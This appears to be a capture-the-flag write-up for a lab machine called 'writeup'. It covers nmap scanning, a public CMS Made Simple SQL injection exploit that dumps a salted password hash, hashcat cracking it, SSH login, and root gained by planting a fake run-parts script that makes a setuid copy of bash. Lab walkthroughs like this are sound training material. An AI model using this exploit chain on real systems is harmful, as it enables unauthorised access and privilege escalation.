Only port 22 and 80 are open:
```
% nmap -p `cat logs/tcp-simple.nmap | grep open | cut -d/ -f1 | tr "\n" "," | sed "s/,$//"` -sC -sV -Pn -oA logs/nmap-tcpscripts $IP
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-31 17:17 AEST
Nmap scan report for 10.10.10.138
Host is up (0.010s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.48 seconds

```

We get a username and the hostname thanks to the email address:
![[Pasted image 20210731171508.png]]

```
jkr@writeup.htb
```

We set /etc/hosts in case the virtual hosts are setup. Webpage doesnt change.

We find stuff in robots.txt
![[Pasted image 20210731171725.png]]

By curling the page we can see what software the application is using due to comments:
![[Pasted image 20210731172329.png]]

Found an exploit which works:
```
% searchsploit cms made simple SQL
[...]
CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
```

Running it returns a salt username and password:
```
% python 46635.py -u http://10.10.10.138/writeup/

[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7

```

Based on the  exploit we get how the hash is generated:
```
% cat 46635.py | grep md5
        if hashlib.md5(str(salt) + line).hexdigest() == password:
```

Using https://hashcat.net/wiki/doku.php?id=example_hashes we can find the hashcat mode to crack this, aka mode 20.

Running hashcat:
```
# hash.txt:
# 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807

% hashcat -m 20 --force hash.txt /usr/share/wordlists/rockyou.txt                  ~/oscp/notes/htb/writeup/exploits
hashcat (v5.1.0) starting...

[...]

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9

Session..........: hashcat
Status...........: Cracked
Hash.Type........: md5($salt.$pass)
Hash.Target......: 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807
Time.Started.....: Sat Jul 31 17:39:19 2021 (2 secs)
Time.Estimated...: Sat Jul 31 17:39:21 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1906.8 kH/s (0.50ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 4362240/14344385 (30.41%)
Rejected.........: 0/4362240 (0.00%)
Restore.Point....: 4359168/14344385 (30.39%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: raymie0506 -> ray061

Started: Sat Jul 31 17:39:07 2021
Stopped: Sat Jul 31 17:39:23 2021
```

We now have a username and password which we can use to login to ssh:
```
% ssh jkr@$IP
The authenticity of host '10.10.10.138 (10.10.10.138)' can't be established.
ECDSA key fingerprint is SHA256:TEw8ogmentaVUz08dLoHLKmD7USL1uIqidsdoX77oy0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.138' (ECDSA) to the list of known hosts.
jkr@10.10.10.138's password:
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
/usr/bin/xauth:  file /home/jkr/.Xauthority does not exist
jkr@writeup:~$ hostname && ip a && whoami && cat user.txt
writeup
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:2e:5b brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.138/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:2e5b/64 scope link
       valid_lft forever preferred_lft forever
jkr
d4e493fd4068afc9eb1aa6a55319f978
```

Ran linpeas and exploit suggester however nothing much was returned. No valid passwords found. Found a hash in `/etc/apache2/passwords` however couldn't crack it.

The path is weird and has `/usr/local/bin` at the start which suggests that we need to abuse the path hijacking:
```
% echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

```

Running pspy we can see that the application runs a command on ssh login:
_Note: If you have an ssh client config which allows session reuse, then you probably will have to wait for someone else to connect to the box to be able to see it._
```
2021/07/31 05:05:48 CMD: UID=1000 PID=6145   | -bash
2021/07/31 05:05:51 CMD: UID=0    PID=6146   | sshd: [accepted]
2021/07/31 05:05:51 CMD: UID=102  PID=6147   | sshd: [net]
2021/07/31 05:05:56 CMD: UID=0    PID=6148   | sshd: jkr [priv]
2021/07/31 05:05:56 CMD: UID=0    PID=6149   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2021/07/31 05:05:56 CMD: UID=0    PID=6150   | run-parts --lsbsysinit /etc/update-motd.d
2021/07/31 05:05:56 CMD: UID=0    PID=6151   | /bin/sh /etc/update-motd.d/10-uname
2021/07/31 05:05:56 CMD: UID=0    PID=6152   | sshd: jkr [priv]
2021/07/31 05:05:56 CMD: UID=1000 PID=6153   | -bash
2021/07/31 05:05:56 CMD: UID=1000 PID=6154   | -bash
2021/07/31 05:05:56 CMD: UID=1000 PID=6155   | -bash
2021/07/31 05:05:56 CMD: UID=1000 PID=6156   | -bash
2021/07/31 05:05:56 CMD: UID=1000 PID=6157   | -bash
2021/07/31 05:06:00 CMD: UID=1000 PID=6158   | -bash
2021/07/31 05:06:01 CMD: UID=0    PID=6159   | /usr/sbin/CRON
2021/07/31 05:06:01 CMD: UID=0    PID=6160   | /usr/sbin/CRON
2021/07/31 05:06:01 CMD: UID=0    PID=6161   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1
```

The following command is vulnerable due to setting the path to a location we can write to and then running a comand without an absolute path. Hence, we can perform path hijacking:
```
% sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
```

We have write access to `/usr/local/sbin` since we're part of the staff group:
```
jkr@writeup:~$ id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
jkr@writeup:~$ ls -dal /usr/local/bin
drwx-wsr-x 2 root staff 20480 Jul 31 05:04 /usr/local/bin

```

Now we can write our exploit to hijack the `run-parts` command.

We write our exploit shellscript which will copy `/bin/bash` to `/tmp` and setuid on it:
```
jkr@writeup:~$ echo '#!/bin/bash' > asdf.sh
jkr@writeup:~$ echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash' >> asdf.sh
jkr@writeup:~$ chmod +x asdf.sh
jkr@writeup:~$ cp asdf.sh /usr/local/sbin/run-parts
```
	
We just need to login again to trigger the exploit:
```
% ssh jkr@$IP
jkr@10.10.10.138's password:

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jul 31 05:09:56 2021 from 10.10.14.23
jkr@writeup:~$ ls
asdf.sh  CRON  user.txt
jkr@writeup:~$ ls /tmp/
bash  enum  lol.txt  ssh-bswiDlYM8A  ssh-ft19Qjjwpg  vmware-root  vmware-root_1453-3980363984
jkr@writeup:~$ /tmp/bash -p
bash-4.4# whoami && ip a && hostname && cat /root/
.bash_history  .bashrc        bin/           .nano/         .profile       root.txt
bash-4.4# whoami && ip a && hostname && cat /root/root.txt
root
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:2e:5b brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.138/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:2e5b/64 scope link
       valid_lft forever preferred_lft forever
writeup
eeba47f60b48ef92b734f9b6198d7226
```